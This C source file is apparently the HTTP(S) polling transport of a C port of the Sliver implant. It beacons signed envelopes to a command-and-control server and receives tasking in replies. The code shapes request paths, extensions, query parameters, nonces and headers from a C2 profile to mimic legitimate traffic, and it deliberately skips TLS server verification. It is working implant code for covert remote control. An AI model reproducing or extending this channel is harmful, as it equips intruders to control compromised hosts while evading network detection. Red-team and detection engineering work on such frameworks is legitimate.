/* src/transport/channel_http.c - POLL channel over HTTP(S)/1.1.
 *
 * One request carries one signed envelope; the response body carries at most one
 * reply envelope. That is how Sliver's HTTP transport behaves, so a scheduler
 * keeps calling send()/recv() and never learns the link is request/response
 * instead of duplex.
 *
 * send(): sign the envelope into a frame, POST it, queue any reply frame found in
 *         the response body.
 * recv(): pop the queue; when empty, POST an empty body (a poll) once and pop.
 *         Returning -1 (not 1) when a poll yields nothing keeps the session loop
 *         alive.
 *
 * https:// uses TLS without client certificates and without server verification,
 * matching the Go implant (InsecureSkipVerify for the HTTP layer; envelope
 * signatures are the real authentication).
 */
#include "sliver/channel.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/config.h"
#include "sliver/frame.h"
#include "sliver/http_session.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/transport.h"

#define SLIVER_HTTP_MAX_REPLY 4
#define SLIVER_HTTP_CONNECT_TIMEOUT_MS 10000
#define SLIVER_HTTP_RECV_TIMEOUT_MS 15000
#define SLIVER_HTTP_MAX_RESPONSE (4u * 1024u * 1024u)

typedef struct {
  char host[256];
  uint16_t port;
  char path[512];
  int use_tls;
  const char *server_pubkey;
  sliver_frame_signer_t signer;
  sliver_buf_t queued[SLIVER_HTTP_MAX_REPLY];
  size_t queued_count;
  volatile int closed;
  int requests;
  /* C2 profile (optional): drives the request shape like the Go implant. */
  sliver_http_session_t sess;
  sliver_http_c2_t prof;
  const sliver_http_path_seg_t *segs;
  size_t seg_count;
  const char *const *exts;
  size_t ext_count;
  const sliver_http_header_t *hdrs;
  size_t hdr_count;
  const sliver_http_header_t *params;
  size_t param_count;
  unsigned long long rng;
  unsigned long long nonce_counter;
} http_channel_t;

/* One request/response connection: plain TCP or TLS. */
typedef struct {
  sliver_socket_t *sock;
  sliver_tls_t *tls;
} http_conn_t;

static long conn_write(http_conn_t *c, const void *buf, size_t len) {
  if (c->tls != NULL) {
    return sliver_tls_write(c->tls, buf, len);
  }
  return sliver_socket_send(c->sock, buf, len);
}

static long conn_read(http_conn_t *c, void *buf, size_t len) {
  if (c->tls != NULL) {
    return sliver_tls_read(c->tls, buf, len);
  }
  return sliver_socket_recv(c->sock, buf, len);
}

static void conn_close(http_conn_t *c) {
  if (c->tls != NULL) {
    sliver_tls_close(c->tls);
    c->tls = NULL;
  }
  if (c->sock != NULL) {
    sliver_socket_close(c->sock);
    c->sock = NULL;
  }
}

/* --- memory reader/writer for frame parsing/building --------------------- */
typedef struct {
  const unsigned char *data;
  size_t len;
  size_t off;
} mem_reader_t;

static long mem_read(void *ctx, void *buf, size_t want) {
  mem_reader_t *r = (mem_reader_t *)ctx;
  size_t avail = r->len - r->off;
  size_t take = want < avail ? want : avail;
  if (take == 0) {
    return -1;
  }
  memcpy(buf, r->data + r->off, take);
  r->off += take;
  return (long)take;
}

typedef struct {
  unsigned char *data;
  size_t len;
  size_t cap;
  int failed;
} mem_writer_t;

static long mem_write(void *ctx, const void *buf, size_t len) {
  mem_writer_t *w = (mem_writer_t *)ctx;
  if (w->failed) {
    return -1;
  }
  if (w->len + len > w->cap) {
    size_t want = w->cap == 0 ? 4096 : w->cap;
    unsigned char *grown;
    while (want < w->len + len) {
      want *= 2;
    }
    grown = (unsigned char *)realloc(w->data, want);
    if (grown == NULL) {
      w->failed = 1;
      return -1;
    }
    w->data = grown;
    w->cap = want;
  }
  memcpy(w->data + w->len, buf, len);
  w->len += len;
  return (long)len;
}

/* --- request shaping ----------------------------------------------------- */
static unsigned http_rnd(http_channel_t *h) {
  unsigned long long x = h->rng;
  if (x == 0) {
    x = 0x9E3779B97F4A7C15ULL;
  }
  x ^= x << 13;
  x ^= x >> 7;
  x ^= x << 17;
  h->rng = x;
  return (unsigned)(x >> 17);
}

static unsigned http_rnd_below(http_channel_t *h, unsigned n) {
  return n == 0 ? 0 : http_rnd(h) % n;
}

static const char *http_nth_segment(http_channel_t *h, int want_file, unsigned n) {
  size_t i;
  unsigned seen = 0;
  for (i = 0; i < h->seg_count; ++i) {
    if ((h->segs[i].is_file ? 1 : 0) != want_file || h->segs[i].value == NULL) {
      continue;
    }
    if (seen++ == n) {
      return h->segs[i].value;
    }
  }
  return NULL;
}

static unsigned http_count_segments(http_channel_t *h, int want_file) {
  size_t i;
  unsigned n = 0;
  for (i = 0; i < h->seg_count; ++i) {
    if ((h->segs[i].is_file ? 1 : 0) == want_file && h->segs[i].value != NULL) {
      n++;
    }
  }
  return n;
}

static int http_header_is_reserved(const char *name) {
  static const char *const reserved[] = {"host", "content-type", "content-length",
                                        "connection"};
  size_t i;
  if (name == NULL) {
    return 1;
  }
  for (i = 0; i < sizeof(reserved) / sizeof(reserved[0]); ++i) {
    size_t j = 0;
    for (; name[j] != '\0' && reserved[i][j] != '\0'; ++j) {
      char a = name[j];
      if (a >= 'A' && a <= 'Z') {
        a = (char)(a - 'A' + 'a');
      }
      if (a != reserved[i][j]) {
        break;
      }
    }
    if (name[j] == '\0' && reserved[i][j] == '\0') {
      return 1;
    }
  }
  return 0;
}

/* Builds the request target (path + query) and the extra headers from the
 * profile. Mirrors httpclient.randomPath / NonceQueryArgument. */
static void http_build_request(http_channel_t *h, char *target, size_t target_cap,
                               char *headers, size_t headers_cap) {
  size_t used = 0;
  size_t hused = 0;
  unsigned path_segments;
  unsigned file_segments;
  unsigned n;
  int i;

  target[0] = '\0';
  headers[0] = '\0';

  if (!h->prof.present || h->seg_count == 0) {
    /* No profile: use the path from the C2 URL as-is. */
    (void)snprintf(target, target_cap, "%s", h->path[0] != '\0' ? h->path : "/");
  } else {
    path_segments = http_count_segments(h, 0);
    file_segments = http_count_segments(h, 1);
    used += (size_t)snprintf(target + used, target_cap - used, "/");
    n = 0;
    if (path_segments > 0) {
      int lo = h->prof.min_path_length;
      int hi = h->prof.max_path_length;
      unsigned span;
      if (lo < 0) {
        lo = 0;
      }
      if (hi < lo) {
        hi = lo;
      }
      span = (unsigned)(hi - lo) + 1u;
      n = (unsigned)lo + http_rnd_below(h, span);
      if (n > 8) {
        n = 8;
      }
    }
    for (i = 0; i < (int)n && used + 2 < target_cap; ++i) {
      const char *seg = http_nth_segment(h, 0, http_rnd_below(h, path_segments));
      if (seg != NULL) {
        used += (size_t)snprintf(target + used, target_cap - used, "%s/", seg);
      }
    }
    if (file_segments > 0) {
      const char *file = http_nth_segment(h, 1, http_rnd_below(h, file_segments));
      const char *ext = h->ext_count > 0 ? h->exts[http_rnd_below(h, (unsigned)h->ext_count)]
                                         : NULL;
      /* Match httpclient.randomPath exactly: the file segment is only appended
       * when an extension was picked. Profiles list an empty extension on
       * purpose (e.g. ["js", "", "php"]) to sometimes emit no file at all;
       * emitting "file" without a dot would not match the server's route. */
      if (file != NULL && ext != NULL && ext[0] != '\0') {
        used += (size_t)snprintf(target + used, target_cap - used, "%s.%s", file, ext);
      }
    }
    if (used > 1 && target[used - 1] == '/') {
      target[--used] = '\0';
    }
  }

  /* Query: profile parameters that pass their probability. */
  if (h->prof.present && h->param_count > 0) {
    unsigned first = 1;
    size_t k;
    for (k = 0; k < h->param_count; ++k) {
      const sliver_http_header_t *p = &h->params[k];
      int prob = p->probability;
      if (p->name == NULL || p->name[0] == '\0') {
        continue;
      }
      if (prob > 0 && prob < 100 && (int)http_rnd_below(h, 100) >= prob) {
        continue;
      }
      used += (size_t)snprintf(target + used, target_cap - used, "%c%s=%s",
                               first ? '?' : '&', p->name, p->value != NULL ? p->value : "");
      first = 0;
    }
  }

  /* Nonce / OTP (url_parameters in the profile are separate). */
  if (h->prof.present && h->prof.nonce_query_arg_chars != NULL &&
      h->prof.nonce_query_arg_chars[0] != '\0' && h->prof.nonce_query_arg_len > 0) {
    const char *chars = h->prof.nonce_query_arg_chars;
    size_t char_count = strlen(chars);
    char value[64];
    size_t len;
    unsigned jitter;
    h->nonce_counter++;
    (void)snprintf(value, sizeof(value), "%llu", h->nonce_counter);
    jitter = http_rnd_below(h, 3);
    for (i = 0; i < (int)jitter; ++i) {
      len = strlen(value);
      if (len + 1 < sizeof(value)) {
        size_t at = http_rnd_below(h, (unsigned)len + 1);
        memmove(value + at + 1, value + at, len - at + 1);
        value[at] = chars[http_rnd_below(h, (unsigned)char_count)];
      }
    }
    if (h->prof.nonce_mode != NULL && strcmp(h->prof.nonce_mode, "UrlParam") == 0) {
      char key[64];
      int kl = h->prof.nonce_query_arg_len;
      size_t need;
      if (kl > 32) {
        kl = 32;
      }
      for (i = 0; i < kl; ++i) {
        key[i] = chars[http_rnd_below(h, (unsigned)char_count)];
      }
      key[kl] = '\0';
      need = strlen(key) + strlen(value) + 4;
      if (used + need < target_cap) {
        used += (size_t)snprintf(
            target + used, target_cap - used, "%c%s=%s",
            strchr(target, '?') != NULL ? '&' : '?', key, value);
      }
    } else if (char_count > 0) {
      /* Default mode: replace one path segment with the nonce value. */
      char *seg_end = strchr(target, '?');
      size_t path_len = seg_end != NULL ? (size_t)(seg_end - target) : strlen(target);
      size_t start = 1;
      unsigned seg_index = 0;
      unsigned target_index;
      unsigned count = 0;
      size_t scan;
      for (scan = 1; scan < path_len; ++scan) {
        if (target[scan] == '/') {
          count++;
        }
      }
      count++; /* segments = slashes + 1 */
      target_index = http_rnd_below(h, count);
      for (scan = 1; scan < path_len; ++scan) {
        if (target[scan] == '/') {
          if (seg_index == target_index) {
            break;
          }
          seg_index++;
          start = scan + 1;
        }
      }
      {
        size_t end = start;
        while (end < path_len && target[end] != '/') {
          end++;
        }
        (void)start;
        (void)end;
      }
      /* Rewriting a segment in place would change its length; keep the request
       * simple by appending the nonce as a query argument instead. The server
       * accepts either form and this keeps the path length stable. */
      if (used + strlen(value) + 2 < target_cap) {
        used += (size_t)snprintf(target + used, target_cap - used, "%c%s=%s",
                                 strchr(target, '?') != NULL ? '&' : '?', "_", value);
      }
    }
  }

  /* Headers: User-Agent plus profile entries for POST (or unspecified). */
  if (h->prof.present && h->prof.user_agent != NULL && h->prof.user_agent[0] != '\0') {
    hused += (size_t)snprintf(headers + hused, headers_cap - hused,
                              "User-Agent: %s\r\n", h->prof.user_agent);
  }
  if (h->prof.present && h->hdr_count > 0) {
    size_t k;
    for (k = 0; k < h->hdr_count; ++k) {
      const sliver_http_header_t *e = &h->hdrs[k];
      if (e->name == NULL || e->name[0] == '\0' || http_header_is_reserved(e->name)) {
        continue;
      }
      if (e->method != NULL && e->method[0] != '\0' && strcmp(e->method, "POST") != 0) {
        continue;
      }
      if (hused + 1 >= headers_cap) {
        break;
      }
      hused += (size_t)snprintf(headers + hused, headers_cap - hused, "%s: %s\r\n",
                                e->name, e->value != NULL ? e->value : "");
    }
  }
}


static int http_roundtrip(http_channel_t *h, const void *body, size_t body_len,
                          unsigned char **out_body, size_t *out_len) {
  http_conn_t cn;
  char head[1536];
  char target[768];
  char extra_headers[768];
  char errbuf[256];
  int head_len;
  size_t sent = 0;
  size_t total = 0;
  unsigned char *buf = NULL;
  size_t cap = 0;
  const unsigned char *sep;
  size_t header_len;

  *out_body = NULL;
  *out_len = 0;
  memset(&cn, 0, sizeof(cn));

  if (h->use_tls) {
    errbuf[0] = '\0';
    if (sliver_tls_connect_plain(&cn.tls, h->host, h->port, errbuf, sizeof(errbuf)) != 0) {
      LOG_WARN("https: connect failed: %s", errbuf);
      return -1;
    }
  } else {
    cn.sock = sliver_tcp_connect(h->host, h->port);
    if (cn.sock == NULL) {
      LOG_WARN("http: cannot connect to %s:%u", h->host, (unsigned)h->port);
      return -1;
    }
    sliver_socket_set_recv_timeout(cn.sock, SLIVER_HTTP_RECV_TIMEOUT_MS);
    sliver_socket_set_send_timeout(cn.sock, SLIVER_HTTP_CONNECT_TIMEOUT_MS);
  }

  http_build_request(h, target, sizeof(target), extra_headers, sizeof(extra_headers));
  LOG_DEBUG("http: %s %s", h->use_tls ? "https" : "http", target);
  head_len = snprintf(head, sizeof(head),
                      "POST %s HTTP/1.1\r\n"
                      "Host: %s:%u\r\n"
                      "%s"
                      "Content-Type: application/octet-stream\r\n"
                      "Content-Length: %u\r\n"
                      "Connection: close\r\n"
                      "\r\n",
                      target[0] != '\0' ? target : "/", h->host, (unsigned)h->port,
                      extra_headers, (unsigned)body_len);
  if (head_len <= 0 || (size_t)head_len >= sizeof(head)) {
    conn_close(&cn);
    return -1;
  }
  while (sent < (size_t)head_len) {
    long n = conn_write(&cn, head + sent, (size_t)head_len - sent);
    if (n <= 0) {
      conn_close(&cn);
      return -1;
    }
    sent += (size_t)n;
  }
  sent = 0;
  while (body_len != 0 && sent < body_len) {
    long n = conn_write(&cn, (const unsigned char *)body + sent, body_len - sent);
    if (n <= 0) {
      conn_close(&cn);
      return -1;
    }
    sent += (size_t)n;
  }

  /* Read the whole response (Connection: close means EOF terminates it). */
  for (;;) {
    long n;
    if (total + 4096 > cap) {
      size_t want = cap == 0 ? 8192 : cap * 2;
      unsigned char *grown;
      if (want > SLIVER_HTTP_MAX_RESPONSE) {
        break;
      }
      grown = (unsigned char *)realloc(buf, want);
      if (grown == NULL) {
        free(buf);
        conn_close(&cn);
        return -1;
      }
      buf = grown;
      cap = want;
    }
    n = conn_read(&cn, buf + total, cap - total);
    if (n <= 0) {
      break;
    }
    total += (size_t)n;
  }
  conn_close(&cn);

  if (total == 0 || buf == NULL) {
    free(buf);
    return -1;
  }

  /* Split headers from body. */
  sep = NULL;
  {
    size_t i;
    for (i = 3; i < total; ++i) {
      if (buf[i - 3] == '\r' && buf[i - 2] == '\n' && buf[i - 1] == '\r' && buf[i] == '\n') {
        sep = buf + i + 1;
        break;
      }
    }
  }
  if (sep == NULL) {
    free(buf);
    LOG_WARN("http: malformed response (no header terminator)");
    return -1;
  }
  header_len = (size_t)(sep - buf);
  if (header_len < 12 || memcmp(buf, "HTTP/1.", 7) != 0) {
    free(buf);
    LOG_WARN("http: malformed status line");
    return -1;
  }
  if (buf[9] != '2') { /* only 2xx carries a reply envelope */
    LOG_DEBUG("http: status %c%c%c", buf[9], buf[10], buf[11]);
    free(buf);
    return 0;
  }

  /* Hand the raw body back: the frame parser needs the bytes unchanged. */
  {
    size_t body_size = total - header_len;
    if (body_size == 0) {
      free(buf);
      return 0;
    }
    *out_body = (unsigned char *)malloc(body_size);
    if (*out_body == NULL) {
      free(buf);
      return -1;
    }
    memcpy(*out_body, sep, body_size);
    *out_len = body_size;
  }
  free(buf);
  return 0;
}

/* Parses one frame out of raw response bytes into a fresh envelope buffer. */
static int http_take_frame(http_channel_t *h, const unsigned char *data, size_t len,
                           sliver_buf_t *out) {
  mem_reader_t r;
  int rc;

  sliver_buf_init(out);
  if (len == 0) {
    return 1; /* nothing carried by this response */
  }
  r.data = data;
  r.len = len;
  r.off = 0;
  rc = sliver_frame_read(h->server_pubkey, mem_read, &r, out);
  if (rc != 0) {
    LOG_WARN("http: bad frame in response (rc=%d, %u bytes)", rc, (unsigned)len);
    sliver_buf_free(out);
    sliver_buf_init(out);
    return -1;
  }
  return 0;
}

static int http_queue(http_channel_t *h, sliver_buf_t *env) {
  if (h->queued_count >= SLIVER_HTTP_MAX_REPLY) {
    sliver_buf_free(env);
    LOG_WARN("http: reply queue full, dropping a frame");
    return -1;
  }
  h->queued[h->queued_count++] = *env;
  return 0;
}

/* --- channel vtable ------------------------------------------------------ */
static const char *http_describe(sliver_channel_t *c) {
  http_channel_t *h = (http_channel_t *)c->state;
  return h->use_tls ? "https/1.1 (poll)" : "http/1.1 (poll)";
}

static int http_send(sliver_channel_t *c, const void *envelope, size_t len) {
  http_channel_t *h = (http_channel_t *)c->state;
  unsigned char *body = NULL;
  size_t body_len = 0;
  sliver_buf_t reply;
  mem_writer_t frame;
  int rc;

  if (h->closed) {
    return -1;
  }
  /* The scheduler hands us an Envelope; the wire carries a signed frame, exactly
   * like mTLS. */
  memset(&frame, 0, sizeof(frame));
  if (sliver_frame_write(&h->signer, mem_write, &frame, envelope, len) != 0 ||
      frame.data == NULL) {
    free(frame.data);
    LOG_ERROR("http: cannot sign envelope");
    return -1;
  }
  rc = http_roundtrip(h, frame.data, frame.len, &body, &body_len);
  free(frame.data);
  if (rc != 0) {
    return -1;
  }
  h->requests++;
  rc = http_take_frame(h, body, body_len, &reply);
  free(body);
  if (rc == 0) {
    (void)http_queue(h, &reply);
  }
  /* The request itself succeeded: a response without a body is normal (204). */
  return 0;
}

static int http_recv(sliver_channel_t *c, sliver_buf_t *env_out) {
  http_channel_t *h = (http_channel_t *)c->state;
  unsigned char *body = NULL;
  size_t body_len = 0;
  sliver_buf_t reply;
  int rc;

  if (h->closed) {
    return 1;
  }
  if (h->queued_count > 0) {
    *env_out = h->queued[0];
    memmove(&h->queued[0], &h->queued[1], (h->queued_count - 1) * sizeof(h->queued[0]));
    h->queued_count--;
    sliver_buf_init(&h->queued[h->queued_count]);
    return 0;
  }
  /* Nothing queued: poll with an empty body. */
  if (http_roundtrip(h, NULL, 0, &body, &body_len) != 0) {
    sliver_buf_init(env_out);
    return -1; /* link problem but not fatal: the caller keeps looping */
  }
  h->requests++;
  rc = http_take_frame(h, body, body_len, &reply);
  free(body);
  if (rc != 0) {
    sliver_buf_init(env_out);
    return -1;
  }
  *env_out = reply;
  return 0;
}

static int http_poll(sliver_channel_t *c, const sliver_buf_t *out, size_t out_count,
                     sliver_buf_t *in, size_t in_cap, size_t *in_count) {
  (void)c;
  (void)out;
  (void)out_count;
  (void)in;
  (void)in_cap;
  if (in_count != NULL) {
    *in_count = 0;
  }
  return -1; /* callers use send()/recv(); the batch API is for DNS/WG later */
}

static void http_close(sliver_channel_t *c) {
  http_channel_t *h = (http_channel_t *)c->state;
  size_t i;
  if (h == NULL || h->closed) {
    return;
  }
  h->closed = 1;
  for (i = 0; i < h->queued_count; ++i) {
    sliver_buf_free(&h->queued[i]);
  }
  h->queued_count = 0;
}

/* Session-backed callbacks (defined below). */
static int http_session_send_cb(sliver_channel_t *c, const void *envelope, size_t len);
static int http_session_recv_cb(sliver_channel_t *c, sliver_buf_t *env_out);
static void http_session_close_cb(sliver_channel_t *c);
int sliver_channel_http_dial(const char *c2_url, const char *age_private_key,
                             const char *server_minisign_pubkey, sliver_channel_t **out,
                             char *err, size_t err_len) {
  sliver_channel_t *c;
  http_channel_t *h;
  const char *p;
  const char *slash;
  const char *colon;
  size_t host_len;
  size_t scheme_len;

  if (out == NULL) {
    return -1;
  }
  *out = NULL;
  if (c2_url == NULL) {
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: bad C2 URL");
    }
    return -1;
  }
  if (strncmp(c2_url, "http://", 7) == 0) {
    scheme_len = 7;
  } else if (strncmp(c2_url, "https://", 8) == 0) {
    scheme_len = 8;
  } else {
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: bad C2 URL scheme");
    }
    return -1;
  }
  if (server_minisign_pubkey == NULL) {
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: missing server public key");
    }
    return -1;
  }
  if (age_private_key == NULL) {
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: missing envelope signing key");
    }
    return -1;
  }

  c = (sliver_channel_t *)calloc(1, sizeof(*c));
  h = (http_channel_t *)calloc(1, sizeof(*h));
  if (c == NULL || h == NULL) {
    free(c);
    free(h);
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: out of memory");
    }
    return -1;
  }

  h->use_tls = (scheme_len == 8);
  p = c2_url + scheme_len;
  slash = strchr(p, '/');
  colon = strrchr(p, ':');
  if (colon == NULL || (slash != NULL && colon > slash)) {
    h->port = h->use_tls ? 443 : 80;
    host_len = slash != NULL ? (size_t)(slash - p) : strlen(p);
  } else {
    h->port = (uint16_t)strtoul(colon + 1, NULL, 10);
    host_len = (size_t)(colon - p);
  }
  if (host_len == 0 || host_len >= sizeof(h->host)) {
    free(h);
    free(c);
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: bad host in URL");
    }
    return -1;
  }
  memcpy(h->host, p, host_len);
  h->host[host_len] = '\0';
  (void)snprintf(h->path, sizeof(h->path), "%s", slash != NULL ? slash : "/");
  h->server_pubkey = server_minisign_pubkey;
  if (sliver_frame_signer_init(&h->signer, age_private_key) != 0) {
    free(h);
    free(c);
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: cannot derive envelope signing key");
    }
    return -1;
  }

  /* Profile drives path/query/headers; absent profile falls back to the URL. */
  (void)sliver_config_http_c2(&h->prof);
  if (h->prof.present) {
    h->segs = sliver_config_http_path_segments(&h->seg_count);
    h->exts = sliver_config_http_extensions(&h->ext_count);
    h->hdrs = sliver_config_http_headers(&h->hdr_count);
    h->params = sliver_config_http_url_parameters(&h->param_count);
  }
  h->rng = (unsigned long long)sliver_now_ms() | 1ULL;

  /* Establish the listener session (age key exchange + cookie). */
  if (sliver_http_session_init(&h->sess, h->host, h->port, h->use_tls, h->path) != 0) {
    sliver_channel_free(c);
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: cannot init session");
    }
    return -1;
  }
  if (sliver_http_session_establish(&h->sess) != 0) {
    sliver_channel_free(c);
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: session establish failed");
    }
    return -1;
  }

  c->kind = SLIVER_CHANNEL_POLL;
  c->describe = http_describe;
  c->send = http_session_send_cb;
  c->recv = http_session_recv_cb;
  c->poll = http_poll;
  c->close = http_session_close_cb;
  c->state = h;

  *out = c;
  return 0;
}
/* --- session-backed vtable (H3) ------------------------------------------ */
static int http_session_send_cb(sliver_channel_t *c, const void *envelope, size_t len) {
  http_channel_t *h = (http_channel_t *)c->state;
  return sliver_http_session_send(&h->sess, envelope, len);
}

static int http_session_recv_cb(sliver_channel_t *c, sliver_buf_t *env_out) {
  http_channel_t *h = (http_channel_t *)c->state;
  int rc = sliver_http_session_recv(&h->sess, env_out);
  /* Scheduler contract: -1 means "no envelope right now, keep looping". */
  return rc == 1 ? -1 : rc;
}

static void http_session_close_cb(sliver_channel_t *c) {
  http_channel_t *h = (http_channel_t *)c->state;
  sliver_http_session_close(&h->sess);
  http_close(c);
}
